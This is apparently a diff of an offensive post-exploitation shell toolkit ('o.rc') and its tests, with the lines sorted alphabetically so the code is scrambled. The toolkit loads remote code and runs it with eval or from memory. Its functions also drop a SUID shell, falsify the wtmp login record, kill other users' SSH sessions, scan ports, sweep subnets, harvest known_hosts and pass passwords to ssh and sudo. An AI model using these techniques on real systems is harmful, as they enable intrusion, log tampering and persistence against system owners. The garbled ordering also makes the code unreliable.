+ The helper functions are typical not called by the user of o.rc
+ The memexec.pl must be included as base64 blob in the Orc script.
+ The memexec.py must be included as bas64 blob in the Orc script.
+ The name of the anonymous file in the process memory
+ The o.rc must be located in the cwd directory.
+ The orc_colorNever variable is defined in the o.rc.
+ The perl script could be executed by
+ The script is designed for a start via start_shunit2.sh
+ The script writes the command line arguments to stdout.
+ The scrpt echo_arguments can be stored on a web server
+ The shunit2 framework must be loaded in the ./shunit2 directory.
+ The simple grep searchs in all parts of the ps output.
+ The text must be single-quoted to prevent changes by the shell
+ The up/down status is not checked because it may fail on different
+ The user functions are designed to be called by the o.rc users.
+ The varaible must not used with quotes because the
+ The variable orc_colorNever is use to support both grep
+ Then the binary program echo_arguments can be stored
+ This is a bash extension. POSIX shell will not support this.
+ Translate a file name with path into a simple name.
+ Try to create a home directory
+ Try to open a TCP connection to given host and port.
+ URL to load the binary program or the script file
+ Ubuntu Precise 12.04 has reached EOL and is not supported by Travis.
+ Usage: grep $orc_colorNever ...
+ Use env to start the script interpreter defined in the shebang
+ Use orc_local only in the form 'orc_local var' not in the form
+ Use simple df call to keep script compatible to the most systems.
+ Use the variable with out quotation. With quotes the empty
+ User Functions 
+ Uses http or https protocol.
+ Variable EUID is defined in the bash.
+ Variable orc_colorNever
+ Writes nothing if not connected to a PTS.
+ alias to the command.
+ all shells. Also orc_local should be the first statement in a
+ and protocol if host is alive.
+ and suppress standard output
+ are widley used linux tools.
+ args]
+ arguments)
+ arguments: Number(s) of PTS. A single number or a list
+ arguments: basename command command-arguments
+ arguments: none
+ argv )
+ as argument is transformed into a name like '_path_name'.
+ ask and ye shall receive
+ attribute user name'
+ awk 'length(X)<length {X=$0}
+ awk '{ print $8 }'
+ awk '{print $2}' 
+ awk '{print $6}' 
+ awk -F ' ' '{print $4}' 
+ base64 encode
+ bash
+ both cases will be exported.
+ brd/) {
+ broadcast 
+ by a hash or a type command. The hash command works in
+ can not create a executable
+ clear http proxy settings for follwing tests
+ compress
+ contain shell variables.
+ could be implemented in the next version.
+ current shell.
+ cut -d ' ' -f 1)
+ decode the Perl script and run the script
+ decode the Python script and run the script
+ don't list this process running the grep
+ drops tiny suid shell
+ empty string must not used as argument.
+ encoder
+ exit
+ exit if home directory access is not possible
+ file destinations.
+ file is very constant. Here a simple regex pattern is implemented to grep
+ file to a storage drive.
+ filter: filesystem tmpfs and each directory only once
+ filter: only existing directories
+ first argument is the URL to load
+ first part of the version number is equal
+ function.
+ gcc echo_arguments.c -o echo_arguments
+ get first number by removing the last 3 numbers
+ get the last 2 numbers by removing the first number
+ grep $orc_colorNever 'no' 2>
+ grep $orc_colorNever 'test' 2>
+ grep $orc_colorNever -i version 
+ grep $orc_colorNever -iv 'FAILED' 
+ grep $orc_colorNever -iv 'incomplete' 
+ grep $orc_colorNever -q 'test' 2>
+ grep $orc_colorNever -v 'grep'
+ grep $orc_colorNever -v 127 
+ grep $orc_colorNever -v inet6 
+ grep $orc_colorNever Daemon
+ grep $orc_colorNever descriptive 
+ grep $orc_colorNever inet 
+ grep $orc_colorNever libc.so 
+ grep $orc_colorNeveri -q 'no' 2>
+ grep --color=never -q 'test' 2> /dev/null
+ grep -i Boot_image 
+ grep -q '/open/tcp/'
+ grep -q 'crypt'
+ grep -q 'no' 2>
+ grep -q 'not'
+ grep -q 'test' 2>
+ grep -q 0
+ grep -qi '
+ grep -qi 'SCTP supported'
+ grep -qi 'hypervisor'
+ grep -qi 'rd.luks.uuid'
+ grep -qi 'vboxvideo'
+ grep -vq '1'
+ grep'
+ gzip -d 
+ gzip and uuencode/uudecode are choosed because they
+ has write access to the login/logout record file.
+ head -n 1 
+ hit[$NF]==0 {hit[$NF]=1
+ https://magisterquis.github.io/2018/03/31/in-memory-only-elf-execution.html
+ https://wiki.debian.org/Multiarch/Tuples
+ https://www.lurklurk.org/syscalls.html
+ i < argc
+ i'd like to pass the -g argument to the script
+ ifconfig version busybox 1.27
+ ifconfig version nettools 2.10
+ in the helper functions section.
+ integer arithmetic.
+ is not supported by mawk. Also the pattern repeat operator
+ it is a IPv4 address
+ it is a IPv6 address or an ethernet address with lower case letters
+ it is a IPv6 address or an ethernet address with upper case letters
+ layer or call tools/programs common for all Unix flavors.
+ matching ifconfig 2.10 Linux
+ matching ifconfig Busybox 1.27
+ memexec
+ more complicated.
+ name = caps'
+ name is the first command line argument.)
+ needed
+ needs upper case variable names. To increase portability
+ no connection and no proxy: remind
+ no good home directory found. Use /dev/shm/.q as error fallback
+ no proxy is defined.
+ numbers valid in a 32-bit signed integer and 64-bit signed
+ o.rc
+ of the subnet.
+ of the tested function.
+ on a web server to load it with the memexec script.
+ optional arguments to pass thru the loaded program
+ or on missing read access and skipping the copy.
+ orc_existsProg find
+ orc_existsProg xz
+ orc_existsProg zip
+ orc_existsTestCommand
+ orc_filterIpAddress
+ orc_filterIpAddress 2>
+ orc_local
+ output   : print to stdout
+ output formats.
+ outputs: pipes stdout into $OUTP/basename.txt
+ overwrite file content
+ perl - ARGUMENTS
+ platform.machine())
+ platform.system())
+ print $2}' /etc/
+ print $6}' 
+ print $NF}' 
+ print a[3]}' 
+ print the true command name of process 1.
+ process grep
+ ps --no-header -weFH
+ pull ssh remote host public fingerprints
+ python - ARGUMENTS
+ python 2 version
+ python 3 version
+ remove one file
+ remove test file
+ remove two files
+ run_shunit2_
+ runs the search in the background and write the filelist
+ scripts_included.sh script
+ second part of the version number is greater or equal
+ secure shredding of files
+ shellcheck disable=2009
+ shellcheck disable=SC1091
+ shellcheck disable=SC2029
+ shellcheck disable=SC2039
+ shift current bits 1 right and set the topmost bit to 1.
+ should be a tmpfs.
+ some shells support 'typeset' and some shells support both.
+ ssh without a tty - qssh [password] [normal arguments]
+ start_shunit2.sh script
+ str ))
+ str(fd)
+ str(os.getpid()) 
+ string will be used as argument.
+ strip comment lines
+ strip empty lines
+ sudo without a tty - qsu [password] [normal arguments]
+ tcp connection error to the server at port 443.
+ test and call the created script.
+ the bash and dash but not in the ksh. The type command
+ the executing system.
+ the https certificate check.
+ the last number
+ the program names.
+ the second number
+ the third number
+ then
+ this (e.g. busybox).
+ this is a good home
+ this is us 
+ to $HOME/sfiles
+ to load it with the memexec script.
+ tools.
+ topbit ))
+ tr '
+ tr ' ' '
+ tr '/' '_'
+ tr -d 
+ try tar with external xz compression
+ try tar with internal xz compression
+ try tar without compression
+ try the old gzip inside tar
+ try to create an executable
+ try to set writeable
+ try to zip the files
+ understand the --color switch
+ usage: dropsuid > [file]
+ use -f to prevent any prompt
+ use the old if-elsif-else structure to be compatible to
+ use the short options -s and -n because not all uname tools
+ where FILE is the file generated by this script and
+ which are installed in your $PATH
+ which writes the addresses into a file.)
+ while read -r i
+ will be not secure destroyed.
+ with the command:
+ {n} is not supported by mawk. Hence the pattern are
+!/bin/sh
+!/usr/bin/env perl
+!/usr/bin/env python3
+!/usr/bin/env sh
+"                  PeerAddr => $ARGV[0], PeerPort => $ARGV[1],"
+"                  Proto => ""tcp"", Type => SOCK_STREAM)"
+"             $ua->ssl_opts(verify_hostname => 0,SSL_verify_mode => 0x00)"
+"            ' -- ""$1"" ""$2"""
+"            ' -- ""$1"""
+"            Or keyword ""all other"" to terminate all but not our SSH."
+"            Or keyword ""all"" to terminate all PTS connected via SSH."
+"           Netmask as integer, NOT dotted format"
+"          find_args=""$find_args -or -name $cmd_name"""
+"          find_args=""( -name $cmd_name"""
+"         ( orc_pingIP4localnet ""$addr"" ""$mask""  >> $HOME/ips )"
+"         echo ""Pinging subnet around $addr with mask $mask"""
+"        dd if=/dev/urandom of=""$file"" bs=""$(stat -c %B -- ""$file"")"" count=""$(stat -c %b -- ""$file"")"" status=none"
+"        dd if=/dev/zero of=""$file"" bs=""$(stat -c %B -- ""$file"")"" count=""$(stat -c %b -- ""$file"")"" status=none"
+"        echo ""$cmd_name"""
+"        echo ""$find_result"""
+"        echo ""Error: '$file' is no regular file"" >"
+"        echo ""Virtual machine! (Virtualbox)"""
+"        if [ ""$n_notfound"" -eq 1 ]"
+"        os.execv(anon, [name, ] "
+"        raise RuntimeError('supports only Linux, but found ' "
+"        rm -f ""$base/.q/.t"""
+"        rm -f -- ""$file"""
+"        rmdir ""$base/.q"""
+"        split(substr($0,RSTART,RLENGTH),item)"
+"        split(substr($0,RSTART,RLENGTH),item,/["
+"        split(substr($0,RSTART,RLENGTH),tmp )"
+"        split(substr($0,RSTART,RLENGTH),tmp)"
+"        split(substr($0,RSTART,RLENGTH),tmp,/[: ]"
+"        wlp3s0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500"
+"       echo ""$addr"" ""$(orc_lengthToIP4netmask ""$bits"")"""
+"       pts=substr($0,index(tolower($0),""pts/"")"
+"      HOME=""$base/.q"""
+"      PYTHONHTTPSVERIFY=0 ""$interpreter"" - ""$url"" '-' ""$@"""
+"      assertEquals ""$t"" ""$(orc_integerToIP4 ""$(orc_IP4toInteger $t)"")"" "
+"      assertNull 'error message (1)' ""$error"""
+"      assertNull 'error message (2)' ""$error"""
+"      echo ""$address is alive"""
+"      echo ""$dir"""
+"      echo ""$i"""
+"      echo ""Error: can't find SSHD PID of $PTS_NAME"" >"
+"      echo ""Error: can't get the owner of $PTS_NAME"" >"
+"      echo ""Host $1 TCP port $port open"""
+"      echo ""process $i seems to be outside the jail..."""
+"      echo 'Error: missing find, need to implement other search' >"
+"      echo 'Info: connection problem, https_proxy could be needed' >"
+"      error=$(orc_integerToIP4 ""$(orc_IP4toInteger $t)"" 2>"
+"      find_args=""$find_args )"""
+"      if (match(tmp,/"
+"      if (match(tmp,/:."
+"      if [ ! -x ""$base/.q/.t"" ] "
+"      if [ -f ""$file"" ]"
+"      if [ -n ""$error"" ]"
+"      if orc_existsProg ""$cmd_name"""
+"      if( $1==ENVIRON[""our_pty""] ) list[$1]=list[$1] "" "
+"      list[$1]=""PTY "" $1 "" is "" now-$2 "" seconds idle and owned by "" $3"
+"      match($0,/Bcast[: ]"
+"      match($0,/brd "
+"      match($0,/inet "
+"      match($0,/inet."
+"      perl - ""$url"" '-' ""$@"""
+"      rm -f ""$base/.q/.t"""
+"      tar -cf ""$1.tar"" ""$2"" "
+"      tar -czf ""$1.tar.gz"" ""$2"" "
+"      tmp = substr($0,RSTART,RLENGTH)"
+"      { tar -cf ""$1.tar"" ""$2"" "
+"    ""$HOME/.mem"" ""$@"""
+"    ' ""$1"" ""$2"""
+"    ' ""$1"""
+"    'aarch64': 385,"
+"    'arm': 385,"
+"    'armeb': 385,"
+"    'i386': 356,"
+"    'ia64': 1340,"
+"    'powerpc': 360,"
+"    'powerpc64': 360,"
+"    'powerpc64le': 360,"
+"    'sparc': 348,"
+"    'x86_64': 319,"
+"    DISPLAY="""" SSH_ASKPASS=""$ORC_ECHO_FILE"" ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no -T ""$@"""
+"    NOT_THIS="""""
+"    OWNER=$(stat -c '%U' ""/dev/$PTS_NAME"")"
+"    PTS_LIST=""$"
+"    PTS_NAME=""pts/$PTS_ID"""
+"    address=$(orc_integerToIP4 ""$value"")"
+"    ash)   busybox ash ""$runner"" "
+"    assertNotNull 'output is null' ""$output"""
+"    assertNull 'error message' ""$error"""
+"    assertTrue 'must be 1 line' ""[ $(echo ""$output"""
+"    assertTrue 'must not negative number' ""[ $output -ge 0 ]"""
+"    assertTrue 'not directory' ""[ -d $t ]"""
+"    bash -c ""echo '' > /dev/tcp/$1/$2"" 2>/dev/null"
+"    bash)  bash -i ""$runner"" "
+"    cp ""$1"" ""$2/$(orc_flatFileName ""$1"")"""
+"    curl --silent --location --insecure -- ""$1"""
+"    dash)  dash ""$runner"" "
+"    echo ""$HOME"""
+"    echo ""$NHOME"""
+"    echo ""$TMPDIR"""
+"    echo ""$XDG_RUNTIME_DIR"""
+"    echo ""$mypts"""
+"    echo ""ERROR: can not download '$address'"" >"
+"    echo ""ERROR: can not download head of '$address'"" >"
+"    echo ""Error: 2nd parameter ($2) must be a directory"" >"
+"    echo ""Error: archiver can not read $2"" >"
+"    echo ""Error: can not archive, the files are in $OUTP"" >"
+"    echo ""Error: can not list IP addresses, no tool found"" >"
+"    echo ""Find the collected files in $ORC_ARCHIVE_FILE"""
+"    echo ""Find the output files in $ORC_ARCHIVE_FILE"""
+"    echo ""GTFOBins: $n_total commands in web page"""
+"    echo ""GTFOBins: found $n_direct in PATH and $n_outside outside PATH"""
+"    echo ""Owner of $PTS_NAME is $OWNER"""
+"    echo ""SSHD PID is $SSHD_PID"""
+"    echo ""Terminating $PTS_NAME"""
+"    echo ""argument '$arg'"""
+"    echo ""run in $1, find results in $HOME/sfiles"""
+"    echo 'Error: missing arguments: name, version1, version2' >"
+"    echo 'Error: need base64, can not decode tool' >"
+"    echo 'Error: need type, other check methods not yet implemented' >"
+"    echo 'Error: no ssh-keyscan program, can not get public keys' >"
+"    echo 'Segmentation Fault.' > ""/dev/$PTS_NAME"""
+"    echo 'Warinng: need perl or python, go in fallback mode' >"
+"    echo 'Warning: need Linux >= 3.17, go in fallback mode' >"
+"    echo 'Warning: need base64, go into fallback mode' >"
+"    echo 'Warning: need gzip, go inti fallback mode' >"
+"    error=$(orc_homeOfUserID ""$userid"" 2>"
+"    fd = ctypes.CDLL(None).syscall(sys_call_nr, '', 1)"
+"    for t in ""$n.2.4.8"" ""$n.0.0.0"" ""$n.255.255.255"" ""$n.128.64.32"" ""$n.22.23.24"""
+"    getsfiles > ""$HOME/sfiles"" "
+"    if ! orc_tryTcpConnection ""$1"" 443"
+"    if [ ! -r ""$base"" ] "
+"    if [ ""$(ss --all --sctp 2> /dev/null "
+"    if [ ""$OWNER"" = """" ]"
+"    if [ ""$SSHD_PID"" = """" ]"
+"    if [ ""$n_notfound"" -gt 0 ] "
+"    if [ ""$value"" -eq ""$lastvalue"" ]"
+"    if [ -d ""$base/.q"" ]"
+"    if [ -d ""$dir"" ]"
+"    if [ -d ""$i"" ]"
+"    if [ -n ""$HTTPS_PROXY"" ] "
+"    if [ -n ""$HTTP_PROXY"" ] "
+"    if [ -n ""$error"" ]"
+"    if [ -r ""$i"" ]"
+"    if [ -w ""$i"" ]"
+"    if [ -x ""$i"" ]"
+"    if [ -z ""$ORC_ARCHIVE_FILE"" ] "
+"    if [ -z ""$ORC_ARCHIVE_FILE"" ]"
+"    if orc_tryTcpConnection ""$1"" ""$port"""
+"    if ping -c1 -n ""$address"" > /dev/null"
+"    if stat -c '%i' ""/proc/$i/root/"" "
+"    kill -9 ""$SSHD_PID"""
+"    ksh)   ksh  -i ""$runner"" "
+"    match($0,/([0-9][0-9]"
+"    match($0,/([A-F0-9]"
+"    match($0,/([a-f0-9]"
+"    mkdir ""$base/.q"" 2>/dev/null"
+"    nmap -oG - -Pn -sT -p ""$2"" ""$1"" "
+"    orc_createEchoFile ""$1"""
+"    orc_loadURL ""$url"" > ""$HOME/.mem"""
+"    orc_testAndCopy ""$dir/.ssh/known_hosts"" ""$OUTP"""
+"    output=$(orc_homeOfUserID ""$userid"")"
+"    ping -c 3 -i 10 -b ""$addr"""
+"    printf ""%s"" ""$i"""
+"    printf( ""argument %2d is '%s'"
+"    rm -f ""$HOME/.mem"""
+"    rm -rf ""$OUTP"""
+"    shred -zfun 2 ""$@"" > /dev/null"
+"    tar -cJf ""$1.tar.xz"" ""$2"" "
+"    wget --quiet --no-check-certificate --output-document=- -- ""$1"""
+"    wipe -fcs ""$@"""
+"    with open(anon, 'wb') as out:"
+"    zip -9Xrq ""$1.zip"" ""$2"" "
+"  ""$@"" >> ""$OUTP/$basename.txt"" 2>> ""$OUTP/$basename.err"""
+"  ENV=""$ENV"" script -c sh /dev/null"
+"  ENV=$(readlink -f ""$ENV"")"
+"  HOME=""/dev/shm/.q"""
+"  ORC_ARCHIVE_FILE="""""
+"  ORC_ECHO_FILE=""$HOME/.c"""
+"  OUTP=""$HOME"""
+"  OUTP=""$HOME/files/"""
+"  SUDO_ASKPASS=""$ORC_ECHO_FILE"" sudo -A ""$@"""
+"  The script runs with bash, dash, ksh."
+"  assertContains 'in download' ""$output"" '"
+"  assertContains 'in download' ""$output"" 'echo'"
+"  assertContains 'in output' ""$output"" 'GTFOBins:'"
+"  assertContains 'in output' ""$output"" 'Orc'"
+"  assertContains 'in output' ""$output"" 'root'"
+"  assertContains 'in return' ""$output"" 'argument_1'"
+"  assertContains 'in return' ""$output"" 'argument_2'"
+"  assertContains 'in return' ""$output"" 'argument_A'"
+"  assertContains 'in return' ""$output"" 'argument_BB'"
+"  assertEquals 'check (1)' ""test"" ""$output"""
+"  assertEquals 'check (2)' ""test second"" ""$output"""
+"  assertEquals 'check (3)' ""test_second"" ""$output"""
+"  assertEquals 'check (4)' ""_test"" ""$output"""
+"  assertEquals 'check (5)' ""_test_second"" ""$output"""
+"  assertEquals 'check (6)' ""_test_second_"" ""$output"""
+"  assertEquals 'http_proxy 1' 'http-test' ""$(sh -c 'echo $http_proxy')"""
+"  assertEquals 'http_proxy 2' 'http-test' ""$(sh -c 'echo $HTTP_PROXY')"""
+"  assertEquals 'http_proxy 3' 'http2-test' ""$(sh -c 'echo $http_proxy')"""
+"  assertEquals 'http_proxy 4' 'http2-test' ""$(sh -c 'echo $HTTP_PROXY')"""
+"  assertEquals 'http_proxy 5' 'http2-test' ""$http_proxy"""
+"  assertEquals 'http_proxy 6' 'http2-test' ""$HTTP_PROXY"""
+"  assertEquals 'https_proxy 1' 'https-test' ""$(sh -c 'echo $https_proxy')"""
+"  assertEquals 'https_proxy 2' 'https-test' ""$(sh -c 'echo $HTTPS_PROXY')"""
+"  assertEquals 'https_proxy 3' 'https2-test' ""$(sh -c 'echo $https_proxy')"""
+"  assertEquals 'https_proxy 4' 'https2-test' ""$(sh -c 'echo $HTTPS_PROXY')"""
+"  assertEquals 'https_proxy 5' 'https2-test' ""$https_proxy"""
+"  assertEquals 'https_proxy 6' 'https2-test' ""$HTTPS_PROXY"""
+"  assertEquals 'lines and words' ""$(( $(echo ""$output"""
+"  assertEquals 'lines and words' ""$(echo ""$output"""
+"  assertEquals 'output (1)' 0.0.0.1 ""$output"""
+"  assertEquals 'output (1)' 1 ""$output"""
+"  assertEquals 'output (1)' 128.0.0.0 ""$output"""
+"  assertEquals 'output (1)' 172.17.2.1 ""$output"""
+"  assertEquals 'output (1)' 172.17.2.254 ""$output"""
+"  assertEquals 'output (2)' 0.0.1.1 ""$output"""
+"  assertEquals 'output (2)' 172.17.2.1 ""$output"""
+"  assertEquals 'output (2)' 172.17.2.62 ""$output"""
+"  assertEquals 'output (2)' 255.255.240.0 ""$output"""
+"  assertEquals 'output (2)' 257 ""$output"""
+"  assertEquals 'output (3)' 0.1.1.1 ""$output"""
+"  assertEquals 'output (3)' 172.17.0.1 ""$output"""
+"  assertEquals 'output (3)' 172.17.15.254 ""$output"""
+"  assertEquals 'output (3)' 255.255.255.0 ""$output"""
+"  assertEquals 'output (3)' 65793 ""$output"""
+"  assertEquals 'output (4)' 1.1.1.1 ""$output"""
+"  assertEquals 'output (4)' 16843009 ""$output"""
+"  assertEquals 'output (4)' 255.255.255.192 ""$output"""
+"  assertEquals 'output invalid' ""$correctoutput"" ""$output"""
+"  assertEquals 'returned not grep' 'test' ""$output"""
+"  assertFalse 'existing (2)' ""[ -f _test_destination/_test_source_f2 ]"""
+"  assertFalse 'existing (4)' ""[ -f _test_destination/_test_source_ff ]"""
+"  assertFalse 'test file 1 not removed' ""[ -e test_file1_for_srm ]"""
+"  assertFalse 'test file 2 not removed' ""[ -e test_file2_for_srm ]"""
+"  assertFalse 'test file not removed' ""[ -e test_file_for_srm ]"""
+"  assertNotNull 'HOME' ""$HOME"""
+"  assertNotNull 'ORC_ECHO_FILE' ""$ORC_ECHO_FILE"""
+"  assertNotNull 'error file (T2)' ""$error"""
+"  assertNotNull 'outp' ""$OUTP"""
+"  assertNotNull 'output file (T2)' ""$output"""
+"  assertNotNull 'output file (T3)' ""$output"""
+"  assertNotNull 'output is null' ""$output"""
+"  assertNull 'error file (T3)' ""$error"""
+"  assertNull 'error message (1)' ""$error"""
+"  assertNull 'error message (2)' ""$error"""
+"  assertNull 'error message in background mode' ""$error"""
+"  assertNull 'error message' ""$error"""
+"  assertNull 'message (1)' ""$output"""
+"  assertNull 'message (2)' ""$output"""
+"  assertNull 'message (3)' ""$output"""
+"  assertNull 'message (4)' ""$output"""
+"  assertNull 'output file (T1)' ""$output"""
+"  assertNull 'output is not null' ""$output"""
+"  assertNull 'output not null (1)' ""$output"""
+"  assertNull 'output not null (2)' ""$output"""
+"  assertNull 'output not null (3)' ""$output"""
+"  assertNull 'output not null (4)' ""$output"""
+"  assertNull 'output not null' ""$output"""
+"  assertTrue  'missing  (1)' ""[ -f _test_destination/_test_source_f1 ]"""
+"  assertTrue  'missing  (3)' ""[ -f _test_destination/_test_source_f3 ]"""
+"  assertTrue 'error file' ""[ -f 'testA.err' ]"""
+"  assertTrue 'home must be a dir' ""[ -d $output ]"""
+"  assertTrue 'less than 1 line' ""[ $(echo ""$output"""
+"  assertTrue 'less than 10 lines' ""[ $(echo ""$output"""
+"  assertTrue 'less than 3 lines' ""[ $(echo ""$output"""
+"  assertTrue 'less than 5 lines in sfiles' ""[ $(wc -l < sfiles) -ge 5 ]"""
+"  assertTrue 'less than 5 lines' ""[ $(echo ""$output"""
+"  assertTrue 'less than 50 words' ""[ $(echo ""$output"""
+"  assertTrue 'missing sfiles' ""[ -f sfiles ]"""
+"  assertTrue 'not directory' ""[ -d $HOME ]"""
+"  assertTrue 'not file' ""[ -f $ORC_ECHO_FILE ]"""
+"  assertTrue 'output file' ""[ -f 'testA.txt' ]"""
+"  awk '/<a href="""
+"  awk -F ':' -v userid=""$1"" '$3 == userid {print $6}'"
+"  awk -v now=""$(date "
+"  backup=$(cat ""$ENV"")"
+"  bash -c ""exec -a "
+"  chmod a-rw,u=rwx ""$ORC_ECHO_FILE"""
+"  die ""This architecture is not supported, arch='$Config{archname}'"" }"
+"  die ""can not read file signature bytes"" }"
+"  die ""can't create anon file, $!"" }"
+"  die ""can't load file from server, status code=$code"" }"
+"  echo ""$1"" "
+"  echo ""$@"" >> ""$OUTP/log.txt"""
+"  echo ""$output"" "
+"  echo ""$str"""
+"  echo "">>> start script '$runner'"""
+"  echo ""File 1"" > _test_source/f1"
+"  echo ""File 2"" > _test_source/f2"
+"  echo ""File 3"" > _test_source/f3"
+"  echo ""Gathering useful command output."""
+"  echo ""Let's see what we can find on the network..."""
+"  echo ""Listing all running services with non-user accounts in passwd."""
+"  echo ""Listing valid users with shells."""
+"  echo ""Pinging local IPv4 address in background writing $HOME/ips ..."""
+"  echo ""Pulling known hosts from some files and writing to $HOME/kh ..."""
+"  echo ""Starting portscan of $1 ..."""
+"  echo ""Warning: no local variables could cause trouble"" >"
+"  echo ""argument '$arg'"""
+"  echo ""echo '$"
+"  echo ""missing argument: Python script name"" >"
+"  echo ""missing argument: perl script name"" >"
+"  echo ""test file 1 for srm"" > test_file1_for_srm"
+"  echo ""test file 2 for srm"" > test_file2_for_srm"
+"  echo ""test file for srm"" > test_file_for_srm"
+"  echo 'ERROR: script needs shell (bash, dash, ksh, ash) as argument' >"
+"  echo 'Error: no limit/ulimit - coredumps left enabled, careful' >"
+"  echo 'Warning: found no good home directory, some functions may fail' >"
+"  elif [ ""$first"" -lt ""$2"" ]"
+"  elif [ ""$interpreter"" = 'perl' ]"
+"  elif [ -n ""$HTTPS_PROXY"" ]"
+"  elif [ -n ""$HTTP_PROXY"" ]"
+"  eval ""$(orc_loadURL ""$1"")"""
+"  exec {$anon} $prog, @ARGV"
+"  fputs( ""This is a output line to stderr"
+"  if ! grep --quiet ""$encoded"" -- o.rc"
+"  if ! head=$(curl --head --silent --insecure --location ""$address"")"
+"  if [ ! ""$correctoutput"" = ""$output"" ]"
+"  if [ ! -d ""$2"" ] "
+"  if [ ! -d ""$2"" ]"
+"  if [ ! -d ""$OUTP"" ]"
+"  if [ ! -r ""$ORC_ECHO_FILE"" ]"
+"  if [ ""$1"" != ""$(uname -s)"" ]"
+"  if [ ""$1"" -lt 1 ] "
+"  if [ ""$1"" = ""all"" ]"
+"  if [ ""$2"" = ""other"" ]"
+"  if [ ""$EUID"" = ""0"" ] "
+"  if [ ""$HOME"" = """" ]"
+"  if [ ""$first"" -gt ""$2"" ]"
+"  if [ ""$first"" -lt ""$3"" ]"
+"  if [ ""$interpreter"" = 'fallback' ]"
+"  if [ ""$value"" = '' ]"
+"  if [ ""/dev/pts/$mypts"" = ""$mytty"" ]"
+"  if [ -n ""$error"" ]"
+"  if [ -n ""$http_proxy"" ]"
+"  if [ -n ""$https_proxy"" ]"
+"  if [ -n ""$output"" ]"
+"  if [ -r ""$1"" ]"
+"  if [ -r ""${BASH_SOURCE[0]}"" ] "
+"  if [ -z ""$ORC_ARCHIVE_FILE"" ] "
+"  if [ -z ""$ORC_ARCHIVE_FILE"" ]"
+"  if [ -z ""$head"" ]"
+"  if [ -z ""$https_proxy"" ] "
+"  if orc_archive ""$HOME/f"" ""$OUTP"""
+"  if orc_archive ""$HOME/kh"" ""$OUTP"""
+"  lastvalue=$(orc_lastIP4integer ""$myaddr"" ""$mask"")"
+"  mask=$(orc_IP4toInteger ""$2"")"
+"  mkdir --mode 700 ""$OUTP"""
+"  myaddr=$(orc_IP4toInteger ""$1"")"
+"  orc_createEchoFile ""$1"""
+"  orc_existsTestCommand ""$@"" > /dev/null 2> /dev/null"
+"  orc_homeOfUserID ""$(id -u)"""
+"  orc_log2outp testA ""$ORC_ECHO_FILE"""
+"  orc_testAndCopy /etc/hosts ""$OUTP"""
+"  orc_testAndCopy /etc/lmhosts ""$OUTP"""
+"  orc_testAndCopy /etc/ssh/known_hosts ""$OUTP"""
+"  output=$(""$ORC_ECHO_FILE"")"
+"  output=$(echo ""$testinput"" "
+"  output=$(orc_flatFileName ""/test"" 2>"
+"  output=$(orc_flatFileName ""/test/second"" 2>"
+"  output=$(orc_flatFileName ""/test/second/"" 2>"
+"  output=$(orc_flatFileName ""test second"" 2>"
+"  output=$(orc_flatFileName ""test"" 2>"
+"  output=$(orc_flatFileName ""test/second"" 2>"
+"  output=$(orc_integerToIP4 ""$(orc_firstIP4integer ""$(orc_IP4toInteger 172.17.2.15)"" ""$(orc_IP4toInteger 255.255.240.0)"")"")"
+"  output=$(orc_integerToIP4 ""$(orc_firstIP4integer ""$(orc_IP4toInteger 172.17.2.15)"" ""$(orc_IP4toInteger 255.255.255.0)"")"")"
+"  output=$(orc_integerToIP4 ""$(orc_firstIP4integer ""$(orc_IP4toInteger 172.17.2.15)"" ""$(orc_IP4toInteger 255.255.255.192)"")"")"
+"  output=$(orc_integerToIP4 ""$(orc_lastIP4integer ""$(orc_IP4toInteger 172.17.2.15)"" ""$(orc_IP4toInteger 255.255.240.0)"")"")"
+"  output=$(orc_integerToIP4 ""$(orc_lastIP4integer ""$(orc_IP4toInteger 172.17.2.15)"" ""$(orc_IP4toInteger 255.255.255.0)"")"")"
+"  output=$(orc_integerToIP4 ""$(orc_lastIP4integer ""$(orc_IP4toInteger 172.17.2.15)"" ""$(orc_IP4toInteger 255.255.255.192)"")"")"
+"  printf( ""exit code of the test program is %d"
+"  ps -e -o pid,comm "
+"  puts( ""The echo_arguments test program"" )"
+"  readonly libcv=""$(ldd ""$(command -v id)"" "
+"  rm -f ""$ORC_ECHO_FILE"""
+"  runner=""$(readlink -e ""$runner"")"""
+"  s.connect((sys.argv[1],int(sys.argv[2])))"
+"  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)"
+"  ssh-keyscan ""$@"""
+"  str=""$(( $1 "
+"  str=""$(( value "
+"  str=""${1"
+"  str=""${str"
+"  system {""env""} '--', $anon, @ARGV }"
+"  touch -r ""$HOME/.l"" /var/log/wtmp"
+"  touch -r /var/log/wtmp ""$HOME/.l"""
+"  url=""$1"""
+"  utmpdump -r -o /var/log/wtmp ""$HOME/.l"""
+"  value=$(orc_firstIP4integer ""$myaddr"" ""$mask"")"
+"  while [ ""$counter"" -gt 0 ]"
+" ! ""$base/.q/.t"" 2>/dev/null"
+" ""(ord('"
+" ""--force"" is not used because the long format is not accepted"
+" $1==""tmpfs"") "
+" ' ""' "
+" '"" ""'.join(arguments) "
+" '""')"
+" -l, -t, --output is not available on some systems, e.g. busybox."
+" 2) Name of program to use for execution,"
+" 255 ))"""
+" 255 )).$str"""
+" A script file must start with """
+" A script file must start with the two characters """
+" Argument: One address as integer, NOT dotted format"
+" Argument: The URL to download, https is supported."
+" Argument: URL of the binary, http or https is supported."
+" Argument: host name, arguments passed through to ssh-keyscan"
+" As fallback load the file into the orc $HOME, this"
+" Checks o.rc for bash, POSIX shell, dash and ksh"
+" Create an anonymous file with name """" and close-on-exec (=1) flag"
+" Failed to open connection to ""session"" message bus: Unable to autolaunch a dbus-daemon without a $DISPLAY for X11"
+" Loads from an URL via curl, wget or perl."
+" Local variables are a useful help but some shells support 'local',"
+" Name of the program to used, because there is no filename"
+" Name of the test functions are ""test_FKT"" where FKT is the name"
+" ORC_ARCHIVE_FILE=""$1.tar"""
+" ORC_ARCHIVE_FILE=""$1.tar.gz"""
+" ORC_ARCHIVE_FILE=""$1.tar.xz"""
+" ORC_ARCHIVE_FILE=""$1.zip"""
+" Output to stdout: IPv4 broadcast addresses, one per line"
+" Output to stdout: List of IP addresses, one address per line"
+" Python version 2 interpreter is often named simply ""python"""
+" Should be start like ""ENV=o.rc sh -i""."
+" TODO: suppress message ""Removing leading '/' from member names"
+" The awk script support gawk and mawk. The match(s,p,a)"
+" The exit code of the program is number of arguments - 2,"
+" The function is silent, does not write a message on copy"
+" Typical this script with ""PYTHONHTTPSVERIFY=0 python"" to switch of"
+" Uses tar, zip or ar."
